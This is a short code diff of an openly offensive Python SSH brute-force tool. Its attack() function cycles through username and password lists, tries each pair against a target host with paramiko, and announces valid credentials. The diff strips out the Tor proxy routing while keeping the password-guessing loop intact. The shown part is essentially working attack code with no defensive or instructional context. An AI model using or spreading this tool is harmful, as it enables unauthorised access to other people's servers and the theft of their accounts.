@@ -44,20 +44,10 @@ def attack():
     while i == 1:
 
         try:
-            print("CONNECTING TO TOR.....")
-            socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
-            socket.socket = socks.socksocket
-            r = requests.get('http://wtfismyip.com/text')
-            print(Style.BRIGHT + Fore.BLUE + "CONNECTED VIA:", r.text)
+            
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            if r.status_code == 200:
-                print(Style.BRIGHT + Fore.YELLOW + "PROXY STATUS:", Style.BRIGHT + Fore.GREEN + "OK")
-            else:
-                print(Style.BRIGHT + Fore.YELLOW + "PROXY STATUS:", Style.BRIGHT + Fore.RED + "BAD")
-            print("TRYING TO SSH CONNECT")
             print("ATTACKING..")
-
             print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
             client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22)
             print(termcolor.colored("[✔] Valid Credentials Found\n", 'cyan'))
